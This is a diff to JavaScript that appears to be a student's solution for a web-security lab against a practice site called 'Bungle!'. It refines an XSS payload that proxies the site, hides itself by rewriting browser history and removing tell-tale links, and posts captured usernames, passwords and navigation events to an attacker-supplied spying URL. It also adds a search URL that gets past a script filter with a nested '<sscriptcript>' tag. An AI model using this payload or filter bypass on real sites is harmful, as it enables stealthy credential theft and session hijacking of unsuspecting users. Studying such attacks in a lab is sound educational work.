@@ -69,10 +69,10 @@ function payload(attacker) {
 
     function concatUrl(spying, event, user, url, pass) {
         to_ret = spying
-        if (event != null) {to_ret += "event=" + event + "&"}
-        if (user != null) {to_ret += "user=" + user + "&"}
-        if (url != null) {to_ret += "url=" + url + "&"}
-        if (pass != null) {to_ret += "pass="+ pass + "&"}
+        if (event !== null) {to_ret += "event=" + event + "&"}
+        if (user !== '') {to_ret += "user=" + user + "&"}
+        if (url !== null) {to_ret += "url=" + url + "&"}
+        if (pass !== null) {to_ret += "pass="+ pass + "&"}
         to_ret = to_ret.substr(0, to_ret.length - 1)
         return to_ret
     }
@@ -93,7 +93,9 @@ function payload(attacker) {
                 // TODO implement spying while being stealthy and persistent. Remove the alert.
                 // alert("Notice that although we injected code into the search page, you see here the main page!")
 
-                window.history.pushState("", "", href);
+                if (window.history.length == 1) {
+                    window.history.replaceState("/", "", "/");
+                }
                 document.title = "Not Bungle!";
 
                 let user = $('#logged-in-user').text();
@@ -106,14 +108,16 @@ function payload(attacker) {
                     var passwd = $('#userpass').val();
                     $.post(target + url, {username: usrname, password: passwd}, function() {
                         $.post(concatUrl(spying_url, 'login', usrname, null, passwd));
-                        proxy('./', spying_url);
+                        window.history.pushState("/", "", "/");
+                        proxy('/', spying_url);
                     });
                 }
                 
                 $('#bungle-lnk, #search-again-btn').click(function(e) {
                     e.preventDefault();
                     $.post(concatUrl(spying_url, 'nav', user, '/', null));
-                    proxy('./', spying_url);
+                    window.history.pushState("/", "", "/");
+                    proxy('/', spying_url);
                 });
 
                 $('#search-btn').click(function(e) {
@@ -121,6 +125,7 @@ function payload(attacker) {
                     var query = $('#query').val();
                     var query_url = "search?q=" + query;
                     $.post(concatUrl(spying_url, 'nav', user, query_url, null));
+                    window.history.pushState(query_url, "", query_url);
                     proxy(query_url, spying_url);
                 });
 
@@ -134,18 +139,27 @@ function payload(attacker) {
                     loginHelper('create');
                 });
 
-                $('$log-out-btn').click(function(e) {
+                $('#log-out-btn').click(function(e) {
                     e.preventDefault();
                     $.post(target + 'logout', function() {
                         $.post(concatUrl(spying_url, 'logout', user, null, null));
-                        proxy('./', spying_url);
+                        window.history.pushState("/", "", "/");
+                        proxy('/', spying_url);
                     });
                 });
+
+                $('a').filter(":contains('<script>')").remove();
+
+                window.onpopstate = function(event) {
+                    var url = window.history.state;
+                    $.post(concatUrl(spying_url, 'nav', user, url, null));
+                    proxy(url, spying_url);
+                };
 
             });
     	}
     //Call Proxy
-	proxy('./', attacker)
+	proxy('/', attacker)
 }
 
 function makeLink(target, attacker, defense) {
@@ -168,7 +182,13 @@ function makeLink(target, attacker, defense) {
                 );
         case 3:
             // TODO: generate XSS URL for defense level 2.2.3.3
-            return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<sscriptcript>" +
+                    payload_string + 
+                    ";payload(\"" + attacker +"\");" + 
+                    "<\/sscriptcript" + ">"
+                );
         case 4:
             // TODO: generate XSS URL payload for defense level 2.2.3.4
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + "SOLVE ME"
